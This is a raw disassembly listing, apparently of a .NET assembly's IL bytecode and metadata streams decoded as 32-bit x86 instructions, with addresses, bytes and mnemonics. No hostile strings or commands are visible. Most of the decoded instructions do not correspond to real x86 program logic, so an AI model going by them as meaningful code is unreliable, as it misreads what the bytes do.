  405743:	08 6f ee             	or     %ch,-0x12(%edi)
  405746:	00 00                	add    %al,(%eax)
  405748:	0a 07                	or     (%edi),%al
  40574a:	28 4a 00             	sub    %cl,0x0(%edx)
  40574d:	00 0a                	add    %cl,(%edx)
  40574f:	28 58 00             	sub    %bl,0x0(%eax)
  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	24 27                	and    $0x27,%al
  405a26:	00 00                	add    %al,(%eax)
  405a28:	23 53 74             	and    0x74(%ebx),%edx
  405a2b:	72 69                	jb     0x405a96
  405a2d:	6e                   	outsb  %ds:(%esi),(%dx)
  405a2e:	67 73 00             	addr16 jae 0x405a31
  405a31:	00 00                	add    %al,(%eax)
  405a33:	00 4c 45 00          	add    %cl,0x0(%ebp,%eax,2)
  405a37:	00 34 28             	add    %dh,(%eax,%ebp,1)
  405a3a:	00 00                	add    %al,(%eax)
  405a3c:	23 55 53             	and    0x53(%ebp),%edx
  405a3f:	00 80 6d 00 00 10    	add    %al,0x1000006d(%eax)
  405a45:	00 00                	add    %al,(%eax)
  405a47:	00 23                	add    %ah,(%ebx)
  405a49:	47                   	inc    %edi
  405a4a:	55                   	push   %ebp
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 90 6d 00 00 40    	add    %dl,0x4000006d(%eax)
  405a55:	09 00                	or     %eax,(%eax)
  405a57:	00 23                	add    %ah,(%ebx)
  405a59:	42                   	inc    %edx
  405a5a:	6c                   	insb   (%dx),%es:(%edi)
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	0e                   	push   %cs
  405adb:	1c 01                	sbb    $0x1,%al
  405add:	00 00                	add    %al,(%eax)
  405adf:	00 00                	add    %al,(%eax)
  405ae1:	00 06                	add    %al,(%esi)
  405ae3:	00 4a 21             	add    %cl,0x21(%edx)
  405ae6:	58                   	pop    %eax
  405ae7:	18 0a                	sbb    %cl,(%edx)
  405ae9:	00 4c 00 21          	add    %cl,0x21(%eax,%eax,1)
  405aed:	1f                   	pop    %ds
  405aee:	0a 00                	or     (%eax),%al
  405af0:	77 21                	ja     0x405b13
  405af2:	ae                   	scas   %es:(%edi),%al
  405af3:	20 0a                	and    %cl,(%edx)
  405af5:	00 0c 18             	add    %cl,(%eax,%ebx,1)
  405af8:	95                   	xchg   %eax,%ebp
  405af9:	26 06                	es push %es
  405afb:	00 30                	add    %dh,(%eax)
  405afd:	1d 7d 13 06 00       	sbb    $0x6137d,%eax
  405b02:	df 0f                	fisttps (%edi)
  405b04:	21 1f                	and    %ebx,(%edi)
  405b06:	0a 00                	or     (%eax),%al
  405b08:	0a 19                	or     (%ecx),%bl
  405b0a:	21 1f                	and    %ebx,(%edi)
  405b0c:	0a 00                	or     (%eax),%al
  405b0e:	77 20                	ja     0x405b30
  405b10:	95                   	xchg   %eax,%ebp
  405b11:	26 06                	es push %es
  405b13:	00 d0                	add    %dl,%al
  405b15:	21 58 18             	and    %ebx,0x18(%eax)
  405b18:	0e                   	push   %cs
  405b19:	00 4d 1a             	add    %cl,0x1a(%ebp)
  405b1c:	b9 13 0e 00 18       	mov    $0x18000e13,%ecx
  405b21:	21 b9 13 06 00 4f    	and    %edi,0x4f000613(%ecx)
  405b27:	25 7d 13 06 00       	and    $0x6137d,%eax
  405b2c:	8f                   	(bad)
  405b2d:	1c 56                	sbb    $0x56,%al
  405b2f:	23 06                	and    (%esi),%eax
  405b31:	00 be 18 58 18 0a    	add    %bh,0xa185818(%esi)
  405b37:	00 aa 1f 2b 00 06    	add    %ch,0x6002b1f(%edx)
  405b3d:	00 24 00             	add    %ah,(%eax,%eax,1)
  405b40:	bd 0a 12 00 19       	mov    $0x1900120a,%ebp
  405b45:	00 b9 1e 12 00 01    	add    %bh,0x100121e(%ecx)
  405b4b:	00 58 18             	add    %bl,0x18(%eax)
  405b4e:	12 00                	adc    (%eax),%al
  405b50:	15 10 b9 1e 06       	adc    $0x61eb910,%eax
  405b55:	00 80 0f 58 18 06    	add    %al,0x618580f(%eax)
  405b5b:	00 ac 13 56 23 06 00 	add    %ch,0x62356(%ebx,%edx,1)
  405b62:	8e 1d 31 20 06 00    	mov    0x62031,%ds
  405b68:	c1 0d 31 20 06 00 34 	rorl   $0x34,0x62031
  405b6f:	18 26                	sbb    %ah,(%esi)
  405b71:	05 06 00 22 11       	add    $0x11220006,%eax
  405b76:	b9 1e 06 00 8f       	mov    $0x8f00061e,%ecx
  405b7b:	11 b9 1e 06 00 3f    	adc    %edi,0x3f00061e(%ecx)
  405b81:	10 5c 1e 6f          	adc    %bl,0x6f(%esi,%ebx,1)
  405b85:	00 d9                	add    %bl,%cl
  405b87:	1e                   	push   %ds
  405b88:	00 00                	add    %al,(%eax)
  405b8a:	06                   	push   %es
  405b8b:	00 67 10             	add    %ah,0x10(%edi)
  405b8e:	a0 19 06 00 ee       	mov    0xee000619,%al
  405b93:	10 a0 19 06 00 cf    	adc    %ah,-0x30fff9e7(%eax)
  405b99:	10 a0 19 06 00 76    	adc    %ah,0x76000619(%eax)
  405b9f:	11 a0 19 06 00 42    	adc    %esp,0x42000619(%eax)
  405ba5:	11 a0 19 06 00 5b    	adc    %esp,0x5b000619(%eax)
  405bab:	11 a0 19 06 00 7e    	adc    %esp,0x7e000619(%eax)
  405bb1:	10 a0 19 06 00 b2    	adc    %ah,-0x4dfff9e7(%eax)
  405bb7:	10 a0 19 06 00 99    	adc    %ah,-0x66fff9e7(%eax)
  405bbd:	10 d0                	adc    %dl,%al
  405bbf:	13 06                	adc    (%esi),%eax
  405bc1:	00 53 10             	add    %dl,0x10(%ebx)
  405bc4:	9a 1e 06 00 24 10 b9 	lcall  $0xb910,$0x2400061e
  405bcb:	1e                   	push   %ds
  405bcc:	06                   	push   %es
  405bcd:	00 0b                	add    %cl,(%ebx)
  405bcf:	11 a0 19 06 00 34    	adc    %esp,0x34000619(%eax)
  405bd5:	0b 7d 13             	or     0x13(%ebp),%edi
  405bd8:	06                   	push   %es
  405bd9:	00 09                	add    %cl,(%ecx)
  405bdb:	23 58 18             	and    0x18(%eax),%ebx
  405bde:	06                   	push   %es
  405bdf:	00 57 22             	add    %dl,0x22(%edi)
  405be2:	58                   	pop    %eax
  405be3:	18 06                	sbb    %al,(%esi)
  405be5:	00 b0 13 56 23 0a    	add    %dh,0xa235613(%eax)
  405beb:	00 01                	add    %al,(%ecx)
  405bed:	26 21 1f             	and    %ebx,%es:(%edi)
  405bf0:	06                   	push   %es
  405bf1:	00 7f 18             	add    %bh,0x18(%edi)
  405bf4:	17                   	pop    %ss
  405bf5:	26 06                	es push %es
  405bf7:	00 5d 1c             	add    %bl,0x1c(%ebp)
  405bfa:	17                   	pop    %ss
  405bfb:	26 06                	es push %es
  405bfd:	00 4e 13             	add    %cl,0x13(%esi)
  405c00:	17                   	pop    %ss
  405c01:	26 06                	es push %es
  405c03:	00 29                	add    %ch,(%ecx)
  405c05:	1a 58 18             	sbb    0x18(%eax),%bl
  405c08:	0a 00                	or     (%eax),%al
  405c0a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405c0b:	20 65 21             	and    %ah,0x21(%ebp)
  405c0e:	0a 00                	or     (%eax),%al
  405c10:	ee                   	out    %al,(%dx)
  405c11:	21 65 21             	and    %esp,0x21(%ebp)
  405c14:	0a 00                	or     (%eax),%al
  405c16:	e3 16                	jecxz  0x405c2e
  405c18:	65 21 0a             	and    %ecx,%gs:(%edx)
  405c1b:	00 3d 26 ae 20 0a    	add    %bh,0xa20ae26
  405c21:	00 9f 0f ae 20 0a    	add    %bl,0xa20ae0f(%edi)
  405c27:	00 8a 0f ae 20 06    	add    %cl,0x620ae0f(%edx)
  405c2d:	00 3f                	add    %bh,(%edi)
  405c2f:	14 58                	adc    $0x58,%al
  405c31:	18 06                	sbb    %al,(%esi)
  405c33:	00 32                	add    %dh,(%edx)
  405c35:	1c 58                	sbb    $0x58,%al
  405c37:	18 06                	sbb    %al,(%esi)
  405c39:	00 a6 18 58 18 0a    	add    %ah,0xa185818(%esi)
  405c3f:	00 24 20             	add    %ah,(%eax,%eiz,1)
  405c42:	65 21 0a             	and    %ecx,%gs:(%edx)
  405c45:	00 de                	add    %bl,%dh
  405c47:	1f                   	pop    %ds
  405c48:	65 21 06             	and    %eax,%gs:(%esi)
  405c4b:	00 44 20 58          	add    %al,0x58(%eax,%eiz,1)
  405c4f:	18 06                	sbb    %al,(%esi)
  405c51:	00 cd                	add    %cl,%ch
  405c53:	0d 58 18 0a 00       	or     $0xa1858,%eax
  405c58:	fe                   	(bad)
  405c59:	17                   	pop    %ss
  405c5a:	ae                   	scas   %es:(%edi),%al
  405c5b:	20 0a                	and    %cl,(%edx)
  405c5d:	00 37                	add    %dh,(%edi)
  405c5f:	16                   	push   %ss
  405c60:	95                   	xchg   %eax,%ebp
  405c61:	26 0a 00             	or     %es:(%eax),%al
  405c64:	be 22 65 21 0a       	mov    $0xa216522,%esi
  405c69:	00 b2 19 21 1f 0a    	add    %dh,0xa1f2119(%edx)
  405c6f:	00 02                	add    %al,(%edx)
  405c71:	20 81 19 06 00 cf    	and    %al,-0x30fff9e7(%ecx)
  405c77:	11 58 18             	adc    %ebx,0x18(%eax)
  405c7a:	06                   	push   %es
  405c7b:	00 5b 16             	add    %bl,0x16(%ebx)
  405c7e:	7d 13                	jge    0x405c93
  405c80:	06                   	push   %es
  405c81:	00 29                	add    %ch,(%ecx)
  405c83:	16                   	push   %ss
  405c84:	58                   	pop    %eax
  405c85:	18 0a                	sbb    %cl,(%edx)
  405c87:	00 75 15             	add    %dh,0x15(%ebp)
  405c8a:	58                   	pop    %eax
  405c8b:	18 0a                	sbb    %cl,(%edx)
  405c8d:	00 6c 0f 58          	add    %ch,0x58(%edi,%ecx,1)
  405c91:	18 06                	sbb    %al,(%esi)
  405c93:	00 68 1d             	add    %ch,0x1d(%eax)
  405c96:	58                   	pop    %eax
  405c97:	18 06                	sbb    %al,(%esi)
  405c99:	00 f0                	add    %dh,%al
  405c9b:	22 7d 13             	and    0x13(%ebp),%bh
  405c9e:	06                   	push   %es
  405c9f:	00 2e                	add    %ch,(%esi)
  405ca1:	18 26                	sbb    %ah,(%esi)
  405ca3:	05 06 00 f9 1d       	add    $0x1df90006,%eax
  405ca8:	7d 13                	jge    0x405cbd
  405caa:	0a 00                	or     (%eax),%al
  405cac:	79 0d                	jns    0x405cbb
  405cae:	ae                   	scas   %es:(%edi),%al
  405caf:	20 06                	and    %al,(%esi)
  405cb1:	00 2d 01 58 18 06    	add    %ch,0x6185801
  405cb7:	00 5c 1a 26          	add    %bl,0x26(%edx,%ebx,1)
  405cbb:	05 0a 00 9c 20       	add    $0x209c000a,%eax
  405cc0:	5c                   	pop    %esp
  405cc1:	1e                   	push   %ds
  405cc2:	0a 00                	or     (%eax),%al
  405cc4:	9e                   	sahf
  405cc5:	1a 5c 1e 06          	sbb    0x6(%esi,%ebx,1),%bl
  405cc9:	00 0b                	add    %cl,(%ebx)
  405ccb:	26 2b 00             	sub    %es:(%eax),%eax
  405cce:	06                   	push   %es
  405ccf:	00 4a 1d             	add    %cl,0x1d(%edx)
  405cd2:	26 05 06 00 48 15    	es add $0x15480006,%eax
